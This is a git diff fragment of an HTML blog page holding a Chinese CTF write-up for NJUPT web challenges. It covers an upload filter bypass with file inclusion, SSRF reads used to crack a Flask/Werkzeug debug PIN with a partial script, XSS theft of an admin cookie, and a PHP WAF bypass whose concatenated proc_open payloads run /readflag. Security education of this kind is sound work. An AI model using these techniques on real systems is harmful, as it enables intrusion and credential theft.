+<h2 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-1.png" alt></p>
 <p>根据题目提示，直接来到上传点</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-2.png" alt="8-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-2.png" alt="8-2"></p>
 <p>对上传类型有限制，更改<code>MIME</code>绕过；对文件中<code>?</code>进行过滤，改为<code>&lt;script language=&#39;php&#39;&gt;</code>绕过；对文件后缀有黑名单限制，先改为图片后缀上传试试，返回：filepath:/var/www/html/upload-imgs/8d6b295524ea3a2c2866443112613aa7/Th1s_is_a_fl4g.jpg</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-3.png" alt></p>
 <p>后来发现这个<code>/uploaded-imgs</code>目录下是各个用户的文件夹，MD5加密后命名</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-4.png" alt></p>
 <p> 并且每个文件夹里都只有一个<code>Th1s_is_a_fl4g.jpg</code>，没有其他东西，并且查看图片只会保存</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-5.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-5.png" alt></p>
 <p>后来发现URL中的<code>action</code>参数存在任意文件包含</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-6.png" alt="8-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-6.png" alt="8-6"></p>
 <p>尝试包含刚才服务器返回给我们的<code>Th1s_is_a_fl4g.jpg</code>文件，直接拿到 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/8-7.png" alt="8-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/8-7.png" alt="8-7"></p>
 <h2 id="flask-website"><a href="#flask-website" class="headerlink" title="flask_website"></a>flask_website</h2><p> SSRF爆破flask PIN码的漏洞，参考：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553</a> </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-1.png" alt="9-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-1.png" alt="9-1"></p>
 <p>爆破PIN码需要的参数如下：</p>
 <blockquote>
 <p>① username =&gt; 通过/etc/passwd获取</p>
@@ -2265,19 +2262,19 @@ while(1):
 <p>④ mac地址 =&gt;  通过/sys/class/net/eth0/address获取（或者eth0换成ens33）</p>
 </blockquote>
 <p>① username（<code>ctf</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-2.png" alt="9-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-2.png" alt="9-2"></p>
 <p>② flask目录下app.py的绝对路径（<code>/usr/local/lib/python3.6/site-packages/flask/app.py</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-5.png" alt="9-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-5.png" alt="9-5"></p>
 <p>③ machine-id（一直在变化）</p>
 <p>尝试<code>/etc/mechine-id</code>返回该文件不存在，尝试<code>/proc/sys/kernel/random/boot_id</code>返回结果也不对</p>
 <p>然后去查看flask的获取pin的源码部分：<code>/usr/local/lib/python3.6/site-packages/werkzeug/debug/__init__.py</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-6.png" alt="9-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-6.png" alt="9-6"></p>
 <p>发现读取machine-id的文件其实是<code>/proc/self/cgroup</code>这个文件，访问取最后一个数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-3.png" alt="9-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-3.png" alt="9-3"></p>
 <p>④ MAC地址（<code>248537822003</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-4.png" alt="9-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-4.png" alt="9-4"></p>
 <p>这里获取到的是<code>02:42:ac:16:00:02</code>，但是爆破需要转换成<code>十进制</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-7.png" alt="9-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-7.png" alt="9-7"></p>
 <p>输入爆破脚本，如下</p>
 <pre><code class="python">import hashlib
 from itertools import chain
@@ -2322,19 +2319,19 @@ if rv is None:
 print(rv)
 </code></pre>
 <p>爆破出PIN码（因为mathine-id一直在变化，所以爆破出来尽快使用）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-8.png" alt="9-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-8.png" alt="9-8"></p>
 <p>先打开<code>debug</code>，点击右边的小console，弹窗中输入PIN码</p>
 <p>验证成功后就可以执行Python命令了，拿下 flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/9-10.png" alt="9-10"></p>
-<h2 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-1.png" alt="10-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/9-10.png" alt="9-10"></p>
+<h2 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h2><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/10-1.png" alt="10-1"></p>
 <p>点击<code>register</code>注册一个用户，然后登陆</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-2.png" alt="10-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/10-2.png" alt="10-2"></p>
 <p>留言功能可以将留言提交给任意用户，测试发现存在XSS，但是有长度限制。利用XSS平台的链接，把留言弹给<code>admin</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-3.png" alt="10-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/10-3.png" alt="10-3"></p>
 <p>用拿到的cookie登录，拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/10-4.png" alt="10-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/10-4.png" alt="10-4"></p>
 <h2 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h2><p>本题是inctf PHP1.0的变形，加上过滤了eval，assert函数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-1.png" alt="11-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-1.png" alt="11-1"></p>
 <p>代码如下</p>
 <pre><code class="php"> &lt;?php
 error_reporting(0);
@@ -2366,13 +2363,13 @@ if(file_exists($usrful)){
 }
 </code></pre>
 <p><code>get_defined_functions()</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-2.png" alt="11-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-2.png" alt="11-2"></p>
 <p>其中</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-3.png" alt="11-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-3.png" alt="11-3"></p>
 <p>所以黑名单就是所有<code>内置函数</code>，然后再加上<code>eval()、assert()</code>。因为php可以按如下方式拼接成一个字符串，所以也就可以完美绕过 WAF</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-4.png" alt="11-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-4.png" alt="11-4"></p>
 <p>我们可以通过以下方式来执行命令</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-5.png" alt="11-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-5.png" alt="11-5"></p>
 <p>disable_function 如下</p>
 <pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,
 pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,
@@ -2382,14 +2379,14 @@ pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,im
 error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,
 delete
 </code></pre><p>发现<code>proc_open()</code>没有被禁用，可以用过它来命令执行，查看flag。但是并不知道flag的路径，但是发现根目录下有<code>/readflag</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-6.png" alt="11-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-6.png" alt="11-6"></p>
 <p>跑这个文件应该就可以拿下flag，因为<code>proc_open()</code>没有直接地结果返回，我们可以将其结果输出到一个文件，再去读取这个文件，payload如下</p>
 <p>Ps：题目环境不允许重复写文件，过后读也不行，所以打的时候换个文件，马上打马上读</p>
 <pre><code>?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z);
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-7.png" alt="11-7"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-7.png" alt="11-7"></p>
 <p>拿下flag</p>
 <pre><code>?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/11-8.png" alt="11-8"></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/NJUPT/11-8.png" alt="11-8"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
